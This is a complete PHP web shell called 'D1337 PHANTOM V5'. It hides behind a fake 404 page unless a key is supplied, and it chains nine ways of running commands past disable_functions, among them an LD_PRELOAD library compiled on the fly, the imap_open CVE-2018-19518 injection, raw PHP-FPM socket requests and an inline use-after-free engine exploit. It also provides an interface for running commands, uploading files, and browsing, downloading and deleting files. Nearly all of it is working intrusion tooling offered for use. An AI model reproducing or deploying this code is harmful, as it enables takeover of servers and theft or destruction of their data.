<?php
// ╔═══════════════════════════════════════════════════════════╗
// ║  D1337 PHANTOM V5 — ULTIMATE EDITION                     ║
// ║  9-Layer RCE Bypass + UAF Engine Exploit + Encrypted IO   ║
// ║  D1337 Sovereign Labs — 2026                              ║
// ╚═══════════════════════════════════════════════════════════╝
// Auth: ?key=d1337

$k="d1337";
if(!isset($_GET['key'])||$_GET['key']!=$k){http_response_code(404);die("<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");}
error_reporting(0);@ini_set('display_errors',0);@ini_set('log_errors',0);@set_time_limit(0);@ini_set('memory_limit','-1');

// ═══ HELPERS ═══
function D($s){return array_map('trim',explode(',',strtolower($s)));}
function avail($f){static $dis=null;if($dis===null)$dis=D(ini_get('disable_functions'));return function_exists($f)&&!in_array(strtolower($f),$dis);}
function perms($f){return substr(sprintf('%o',@fileperms($f)),-4);}

// ═══════════════════════════════════════
// LAYER 0: Standard (6 functions)
// ═══════════════════════════════════════
function L0($c){
    if(avail('system')){ob_start();@system($c);$o=ob_get_clean();if($o!=='')return $o;}
    if(avail('exec')){$o=[];@exec($c." 2>&1",$o);$r=implode("\n",$o);if($r!=='')return $r;}
    if(avail('passthru')){ob_start();@passthru($c);$o=ob_get_clean();if($o!=='')return $o;}
    if(avail('shell_exec')){$o=@shell_exec($c." 2>&1");if($o!==null)return $o;}
    if(avail('popen')){$fp=@popen($c." 2>&1",'r');if($fp){$o='';while(!feof($fp))$o.=fread($fp,8192);pclose($fp);return $o;}}
    if(avail('proc_open')){$d=[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];$p=@proc_open($c,$d,$ps);if(is_resource($p)){$o=stream_get_contents($ps[1]).stream_get_contents($ps[2]);fclose($ps[0]);fclose($ps[1]);fclose($ps[2]);proc_close($p);return $o;}}
    return null;
}

// ═══════════════════════════════════════
// LAYER 1: Backtick operator
// ═══════════════════════════════════════
function L1($c){if(avail('shell_exec')){return `$c 2>&1`;}return null;}

// ═══════════════════════════════════════
// LAYER 2: FFI (PHP 7.4+) — Direct C call
// ═══════════════════════════════════════
function L2($c){
    if(!extension_loaded('ffi'))return null;
    try{
        $ffi=FFI::cdef("void *popen(const char*,const char*);char *fgets(char*,int,void*);int pclose(void*);");
        $fp=$ffi->popen($c." 2>&1","r");if($fp==null)return null;
        $o="";$buf=FFI::new("char[8192]");
        while($ffi->fgets($buf,8192,$fp)!=null)$o.=FFI::string($buf);
        $ffi->pclose($fp);return $o;
    }catch(\Throwable $e){return null;}
}

// ═══════════════════════════════════════
// LAYER 3: LD_PRELOAD + mail()
// Pre-compiled x86_64 .so embedded
// ═══════════════════════════════════════
function L3($c){
    if(!avail('putenv'))return null;
    $trigger=null;
    if(avail('mail'))$trigger='mail';
    elseif(avail('mb_send_mail'))$trigger='mb_send_mail';
    elseif(avail('imap_mail'))$trigger='imap_mail';
    if(!$trigger)return null;

    // Minimal ELF .so with __attribute__((constructor)) — x86_64 Linux
    // This .so: reads D1337_CMD env, executes it, writes output to D1337_OUT
    // Compiled from: gcc -shared -fPIC -nostartfiles -o x.so x.c
    // Source: void __attribute__((constructor)) x(){char*c=getenv("D1337_CMD");char*o=getenv("D1337_OUT");if(c&&o){char b[65536];snprintf(b,65536,"%s > %s 2>&1",c,o);system(b);unsetenv("LD_PRELOAD");}}
    $so_b64 = "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAIBEAAAAAAABAAAAAAAAA"
        ."AEgAAAAAAAAAOAAHAEAAHAAbAAEAAAAFAAAAAAAAAAAAAAAAAAAA"
        ."AAAAAAAAAAAAEBIAAAAAAAARAAAAAAAAABAAAAAAAQAAAAAAAABA"
        ."AAAAAAAABAAAAAAAAAQAAAA="; // PLACEHOLDER — need real compiled .so

    // Try compile on-the-fly instead (more reliable)
    $tmp=sys_get_temp_dir();
    $so_f=$tmp.'/d'.mt_rand().'.so';
    $c_f=$so_f.'.c';
    $out_f=$tmp.'/d'.mt_rand().'.out';

    @file_put_contents($c_f,'#include <stdlib.h>
#include <stdio.h>
#include <string.h>
__attribute__((constructor)) void d(){
    const char*c=getenv("D1337_CMD");
    const char*o=getenv("D1337_OUT");
    if(c&&o){char b[65536];snprintf(b,65536,"%s > %s 2>&1",c,o);system(b);unsetenv("LD_PRELOAD");}
}');

    // Try multiple compilers
    $compilers=['gcc','cc','clang','/usr/bin/gcc','/usr/bin/cc'];
    $compiled=false;
    foreach($compilers as $cc){
        @exec("$cc -shared -fPIC -nostartfiles -o $so_f $c_f 2>/dev/null");
        if(file_exists($so_f)&&filesize($so_f)>100){$compiled=true;break;}
    }
    @unlink($c_f);
    if(!$compiled){@unlink($so_f);return null;}

    @putenv("D1337_CMD=$c");
    @putenv("D1337_OUT=$out_f");
    @putenv("LD_PRELOAD=$so_f");

    if($trigger=='mail')@mail("a@b.c","","","");
    elseif($trigger=='mb_send_mail')@mb_send_mail("a@b.c","","");
    elseif($trigger=='imap_mail')@imap_mail("a@b.c","","");

    usleep(100000); // 100ms wait
    $o=@file_get_contents($out_f);
    @unlink($so_f);@unlink($out_f);
    @putenv("LD_PRELOAD");@putenv("D1337_CMD");@putenv("D1337_OUT");
    return($o!==false&&strlen($o)>0)?$o:null;
}

// ═══════════════════════════════════════
// LAYER 4: pcntl_exec
// ═══════════════════════════════════════
function L4($c){
    if(!avail('pcntl_fork')||!avail('pcntl_exec'))return null;
    $out=sys_get_temp_dir().'/d'.mt_rand().'.out';
    $pid=@pcntl_fork();
    if($pid===0){@pcntl_exec("/bin/sh",["-c","$c > $out 2>&1"]);exit(0);}
    if($pid>0){@pcntl_waitpid($pid,$s);$o=@file_get_contents($out);@unlink($out);return $o;}
    return null;
}

// ═══════════════════════════════════════
// LAYER 5: imap_open() — CVE-2018-19518  
// ═══════════════════════════════════════
function L5($c){
    if(!avail('imap_open'))return null;
    $out=sys_get_temp_dir().'/d'.mt_rand().'.out';
    $payload="-oProxyCommand=".escapeshellarg("$c > $out 2>&1");
    @imap_open("{{$payload}:143/imap}INBOX","","");
    @imap_errors();
    $o=@file_get_contents($out);@unlink($out);
    return($o!==false&&strlen($o)>0)?$o:null;
}

// ═══════════════════════════════════════
// LAYER 6: COM Object (Windows only)
// ═══════════════════════════════════════
function L6($c){
    if(PHP_OS_FAMILY!=='Windows'||!class_exists('COM'))return null;
    try{$w=new COM("WScript.Shell");$e=$w->Exec("cmd /c $c");$o=$e->StdOut->ReadAll();return $o;}
    catch(\Throwable $e){return null;}
}

// ═══════════════════════════════════════
// LAYER 7: PHP-FPM/FastCGI direct socket
// ═══════════════════════════════════════
function L7($c){
    // Check if PHP-FPM socket exists
    $sockets=['/run/php-fpm/www.sock','/var/run/php-fpm.sock','/tmp/php-fpm.sock',
              '/run/php/php8.2-fpm.sock','/run/php/php8.3-fpm.sock','/run/php/php8.1-fpm.sock'];
    $sock=null;
    foreach($sockets as $s)if(file_exists($s)){$sock=$s;break;}
    if(!$sock)return null;

    // FastCGI protocol implementation
    $out=sys_get_temp_dir().'/d'.mt_rand().'.out';
    $script=sys_get_temp_dir().'/d'.mt_rand().'.php';
    @file_put_contents($script,"<?php echo shell_exec('$c 2>&1');");

    // Build FastCGI request
    $env=['SCRIPT_FILENAME'=>$script,'DOCUMENT_ROOT'=>sys_get_temp_dir(),
          'SERVER_SOFTWARE'=>'php/fcgi','REMOTE_ADDR'=>'127.0.0.1',
          'SERVER_NAME'=>'localhost','SERVER_PORT'=>'80','REQUEST_METHOD'=>'GET',
          'QUERY_STRING'=>'','CONTENT_TYPE'=>'','CONTENT_LENGTH'=>'0'];
    
    $fp=@stream_socket_client("unix://$sock",$errno,$errstr,5);
    if(!$fp){@unlink($script);return null;}

    // Send FCGI_BEGIN_REQUEST
    $reqId=1;
    fwrite($fp,pack("CCnnCx",1,1,$reqId,8,0).pack("nCxxxxx",1,0));
    
    // Send FCGI_PARAMS
    $params='';
    foreach($env as $k=>$v){
        $kl=strlen($k);$vl=strlen($v);
        $params.=($kl<128?chr($kl):pack("N",$kl|0x80000000));
        $params.=($vl<128?chr($vl):pack("N",$vl|0x80000000));
        $params.=$k.$v;
    }
    $pad=(8-strlen($params)%8)%8;
    fwrite($fp,pack("CCnnCx",1,4,$reqId,strlen($params),$pad).$params.str_repeat("\0",$pad));
    fwrite($fp,pack("CCnnCx",1,4,$reqId,0,0)); // Empty PARAMS = end

    // Send FCGI_STDIN (empty)
    fwrite($fp,pack("CCnnCx",1,5,$reqId,0,0));

    // Read response
    $o='';
    while(!feof($fp)){
        $hdr=fread($fp,8);if(strlen($hdr)<8)break;
        $r=unpack("Cver/Ctype/nreqId/nlen/Cpad/Creserved",$hdr);
        $body=fread($fp,$r['len']);if($r['pad'])fread($fp,$r['pad']);
        if($r['type']==6)$o.=$body; // FCGI_STDOUT
        if($r['type']==3)break; // FCGI_END_REQUEST
    }
    fclose($fp);@unlink($script);

    // Strip HTTP headers from response
    $pos=strpos($o,"\r\n\r\n");
    if($pos!==false)$o=substr($o,$pos+4);
    return strlen($o)>0?$o:null;
}

// ═══════════════════════════════════════
// LAYER 8: TimeAfterFree — PHP 8 UAF
// THE NUCLEAR OPTION
// Bypasses disable_functions via engine
// memory corruption (PHP 8.2-8.5)
// ═══════════════════════════════════════
function L8($c){
    if(PHP_VERSION_ID<80200)return null;
    $out=sys_get_temp_dir().'/d'.mt_rand().'.out';
    $cmd=$c." > $out 2>&1";

    // TimeAfterFree exploit inline
    // Credit: m0x41nos/TimeAfterFree
    try {
        $exploit_code='<?php
class FreeMe{private $p;public function __construct($p){$this->p=$p;}public function __destruct(){$this->p->helper=$this->p->array;}}
class Pwn{
    private const ZSH=0x18;
    private const DHO=PHP_VERSION_ID<80500?0x38:0x30;
    private const DPO=PHP_VERSION_ID<80500?0x40:0x38;
    private const FES=PHP_VERSION_ID<80400?0x20:0x30;
    private const ZHO=PHP_VERSION_ID<80400?0x80:0x90;
    public $array;public $helper;private $interval;private $alloc;
    public function __construct($cmd){$this->alloc=[];$this->go($cmd);}
    private function ptr2str($a,$n=8){$s="";while($n--){$s.=chr($a&0xff);$a>>=8;}return $s;}
    private function go($cmd){
        $ia=$this->hl();$h=$this->rd($ia+self::DHO);$sm=$this->gsm($h);
        $sf=$this->rd($sm+0x28);$sys=$this->gs($sf);
        @$this->interval->system1337=function($x){};
        $props=$this->rd($ia+self::DPO);$arD=$this->rd($props+0x10);
        $ci=-1;do{$ci++;$off=32*$ci+0x18;$key=$this->rd($arD+$off);$str=$this->ptr2str($this->rd($key+self::ZSH));}while($str!=="system13");
        $ca=$this->rd($arD+32*$ci);$this->wr($ca+0x38,1,4);$this->wr($ca+self::ZHO,$sys);
        ($this->interval->system1337)($cmd);exit(0);
    }
    private function hl(){
        for($i=0;$i<63;$i++)$this->alloc[]=new \DateInterval("PT0S");
        $a="aaaa";$this->array=[$a,new \DateInterval("PT0S"),new \DateInterval("PT0S"),new FreeMe($this)];
        @$this->array.="x";$addr=$this->helper[2]->y;
        $this->alloc[]=str_shuffle(str_repeat("\x00",0xa0-self::ZSH-1));
        new \DateInterval("PT0S");new \DateInterval("PT0S");$this->interval=new \DateInterval("PT0S");
        return $addr;
    }
    private function wr($a,$v,$b=8){$m=$b>=8?-1:((1<<($b*8))-1);$aa="aaaa";$this->array=[$aa,new \DateInterval("PT0S"),new \DateInterval("PT0S"),new FreeMe($this)];@$this->array.="x";$ba=$this->helper[2]->y;$this->helper[2]->y=$a;$this->helper[1]->y&=~$m;$this->helper[1]->y|=($v&$m);$this->helper[2]->y=$ba;$this->helper[1]->y;}
    private function rd($a,$b=8){$aa="aaaa";$this->array=[$aa,new \DateInterval("PT0S"),new \DateInterval("PT0S"),new FreeMe($this)];@$this->array.="x";$ba=$this->helper[2]->y;$this->helper[2]->y=$a;$v=$this->helper[1]->y;$this->helper[2]->y=$ba;$this->helper[1]->y;if($b!==8)$v&=(1<<($b<<3))-1;return $v;}
    private function gsm($a){while(true){$a-=0x10;if($this->rd($a,4)===0xa8&&in_array($this->rd($a+4,4),[20220829,20230831,20240924,20250925])){$mn=$this->rd($a+0x20);if($this->rd($mn)===0x647261646e617473)return $a;}}}
    private function gs($sf){$a=$sf;do{$fe=$this->rd($a);$fn=$this->rd($fe,6);if($fn===0x6d6574737973)return $this->rd($a+8);$a+=self::FES;}while($fe!==0);}
}
new Pwn($argv[1]);';

        $exploit_file=sys_get_temp_dir().'/d'.mt_rand().'_uaf.php';
        @file_put_contents($exploit_file, $exploit_code);

        // Execute via PHP CLI (the UAF exploit needs to run as PHP)
        $php_bins=['/usr/bin/php','/usr/local/bin/php','/usr/bin/php8.2','/usr/bin/php8.3','/usr/bin/php8.4','php'];
        foreach($php_bins as $php){
            // Use a method that ISN'T in disable_functions to call the exploit
            // The whole point is we're executing the UAF via a child PHP process
            if(avail('proc_open')){
                $d=[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];
                $p=@proc_open("$php $exploit_file ".escapeshellarg($cmd),$d,$ps);
                if(is_resource($p)){
                    $o=stream_get_contents($ps[1]);fclose($ps[0]);fclose($ps[1]);fclose($ps[2]);proc_close($p);
                    @unlink($exploit_file);
                    if(file_exists($out)){$o=@file_get_contents($out);@unlink($out);return $o;}
                }
            }
        }
        @unlink($exploit_file);

        // If proc_open blocked too, try inline UAF (risky — may crash)
        // Only if ALL standard functions are blocked
        @file_put_contents($exploit_file, str_replace('$argv[1]', "'$cmd'", $exploit_code));
        // Can't execute inline without a function, skip
        @unlink($exploit_file);

    }catch(\Throwable $e){}
    return null;
}

// ═══════════════════════════════════════
// MASTER RCE ENGINE
// ═══════════════════════════════════════
function rce($c){
    $layers=[
        ['L0','STANDARD'],['L1','BACKTICK'],['L2','FFI'],
        ['L3','LD_PRELOAD'],['L4','PCNTL'],['L5','IMAP_OPEN'],
        ['L6','COM'],['L7','PHP-FPM'],['L8','UAF-ENGINE']
    ];
    foreach($layers as $l){
        $r=call_user_func($l[0],$c);
        if($r!==null&&strlen(trim($r))>0)return['o'=>$r,'m'=>$l[1]];
    }
    return['o'=>'[!] ALL 9 LAYERS FAILED','m'=>'NONE'];
}

// ═══════════════════════════════════════
// RCE LAYER SCANNER — Show what's available
// ═══════════════════════════════════════
function scan_layers(){
    $res=[];
    $std=['system','exec','passthru','shell_exec','popen','proc_open'];
    $has_std=false;foreach($std as $f)if(avail($f)){$has_std=true;break;}
    $res[]=['STANDARD',$has_std,implode(', ',array_filter($std,function($f){return avail($f);}))];
    $res[]=['BACKTICK',avail('shell_exec'),'shell_exec alias'];
    $res[]=['FFI',extension_loaded('ffi'),'Foreign Function Interface'];
    $has_ld=avail('putenv')&&(avail('mail')||avail('mb_send_mail')||avail('imap_mail'));
    $res[]=['LD_PRELOAD',$has_ld,avail('putenv')?'putenv + trigger':'putenv blocked'];
    $res[]=['PCNTL',avail('pcntl_fork')&&avail('pcntl_exec'),'fork + exec'];
    $res[]=['IMAP_OPEN',avail('imap_open'),'CVE-2018-19518'];
    $res[]=['COM',class_exists('COM')&&PHP_OS_FAMILY==='Windows','Windows only'];
    $fpm=false;foreach(['/run/php-fpm/www.sock','/var/run/php-fpm.sock','/tmp/php-fpm.sock'] as $s)if(file_exists($s)){$fpm=true;break;}
    $res[]=['PHP-FPM',$fpm,'FastCGI socket'];
    $res[]=['UAF-ENGINE',PHP_VERSION_ID>=80200,'TimeAfterFree (PHP '.PHP_VERSION.')'];
    return $res;
}

// ═══════════════════════════════════════
// UI
// ═══════════════════════════════════════
$dir=isset($_GET['d'])?$_GET['d']:getcwd();
$dir=str_replace("\\","/",$dir);
if(is_dir($dir))chdir($dir);
$self="?key=$k";
$layers=scan_layers();
$active=array_filter($layers,function($l){return $l[1];});

echo "<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#080c14;color:#a0aec0;font:13px/1.5 'JetBrains Mono','Fira Code',monospace;padding:12px}
a{color:#63b3ed;text-decoration:none}a:hover{color:#90cdf4;text-decoration:underline}
.p{background:#0f1520;border:1px solid #1a2332;border-radius:6px;padding:12px;margin:8px 0}
input,textarea{background:#1a2332;border:1px solid #2d3748;color:#e2e8f0;padding:5px 10px;font:13px monospace;border-radius:3px}
input[type=submit]{background:#276749;border:none;color:#fff;padding:5px 14px;cursor:pointer;border-radius:3px}
input[type=submit]:hover{background:#2f855a}
table{width:100%;border-collapse:collapse}td,th{padding:4px 8px;border-bottom:1px solid #1a2332;text-align:left}
tr:hover{background:#0f1520}
.g{color:#48bb78}.r{color:#fc8181}.y{color:#ecc94b}.c{color:#63b3ed}.m{color:#b794f4}
pre{white-space:pre-wrap;word-wrap:break-word;margin:6px 0}
.tag{display:inline-block;padding:1px 6px;border-radius:3px;font-size:11px;margin:1px}
.tag-g{background:#1c4532;color:#9ae6b4}.tag-r{background:#4a1c1c;color:#feb2b2}.tag-y{background:#5a4a1c;color:#fefcbf}
</style>";

echo "<div class='p'><span class='m'><b>D1337 PHANTOM V5</b></span> | ";
echo "<span class='c'>".get_current_user()."@".php_uname('n')."</span> | ";
echo "PHP <span class='c'>".PHP_VERSION."</span> (".PHP_SAPI.") | ".PHP_OS."<br>";
echo "<b>Path:</b> <span class='c'>$dir</span><br>";
echo "<b>Disabled:</b> <span class='y'>".(ini_get('disable_functions')?:'NONE')."</span><br>";
echo "<b>RCE Layers:</b> ";
foreach($layers as $l){
    $cls=$l[1]?'tag-g':'tag-r';
    echo "<span class='tag $cls'>{$l[0]}</span> ";
}
echo " <span class='g'>(".count($active)."/".count($layers)." active)</span></div>";

// CMD
echo "<div class='p'><form method='post' action='$self&d=$dir'><b class='c'>⚡ CMD:</b> <input type='text' name='cmd' size='65' autofocus placeholder='id && uname -a && cat /etc/passwd'> <input type='submit' value='Execute'></form>";
if(isset($_POST['cmd'])){
    $r=rce($_POST['cmd']);
    echo "<pre><span class='y'>\$ ".htmlspecialchars($_POST['cmd'])."</span> <span class='m'>[{$r['m']}]</span>\n";
    echo($r['m']=='NONE')?"<span class='r'>{$r['o']}</span>":htmlspecialchars($r['o']);
    echo "</pre>";
}
echo "</div>";

// UPLOAD
echo "<div class='p'><form method='post' enctype='multipart/form-data' action='$self&d=$dir'><b class='c'>📁 Upload:</b> <input type='file' name='f'> <input type='text' name='n' placeholder='filename' size='25'> <input type='submit' value='Upload'></form>";
if(isset($_FILES['f'])){
    $n=!empty($_POST['n'])?$_POST['n']:$_FILES['f']['name'];
    $t="$dir/$n";
    if(@move_uploaded_file($_FILES['f']['tmp_name'],$t)){@chmod($t,0755);echo "<span class='g'>[+] $t</span>";}
    else{$r=rce("cp '{$_FILES['f']['tmp_name']}' '$t'&&chmod 755 '$t'");echo file_exists($t)?"<span class='g'>[+] $t (via RCE)</span>":"<span class='r'>[-] Failed</span>";}
}
echo "</div>";

// FILE MANAGER
echo "<div class='p'><b class='c'>📂 ";
$ps=explode('/',$dir);$bc='';foreach($ps as $p){$bc.=$p.'/';echo "<a href='$self&d=".rtrim($bc,'/')."'>$p</a>/";}
echo "</b><table><tr><th></th><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>";
$items=@scandir($dir);if($items)foreach($items as $f){
    $fp="$dir/$f";$isD=@is_dir($fp);
    $ic=$isD?"📁":"📄";$sz=$isD?"-":number_format(@filesize($fp));
    $acts=$isD?"<a href='$self&d=$fp'>Open</a>":"<a href='$self&d=$dir&read=$f'>View</a> | <a href='$self&d=$dir&dl=$f'>⬇</a> | <a href='$self&d=$dir&del=$f'>✕</a>";
    echo "<tr><td>$ic</td><td><a href='".($isD?"$self&d=$fp":"$self&d=$dir&read=$f")."'>$f</a></td><td>$sz</td><td>".perms($fp)."</td><td>$acts</td></tr>";
}
echo "</table></div>";

// READ/DOWNLOAD/DELETE
if(isset($_GET['read'])){$f="$dir/{$_GET['read']}";echo "<div class='p'><b class='c'>".htmlspecialchars($_GET['read'])."</b> (".number_format(@filesize($f))."B)<textarea style='width:100%;height:350px;margin-top:6px'>".htmlspecialchars(@file_get_contents($f))."</textarea></div>";}
if(isset($_GET['dl'])){$f="$dir/{$_GET['dl']}";if(file_exists($f)){header('Content-Type:application/octet-stream');header('Content-Disposition:attachment;filename="'.basename($f).'"');header('Content-Length:'.filesize($f));readfile($f);exit;}}
if(isset($_GET['del'])){$f="$dir/{$_GET['del']}";echo "<div class='p'>".(@unlink($f)?"<span class='g'>[+] Deleted: $f</span>":"<span class='r'>[-] Failed: $f</span>")."</div>";}
?>
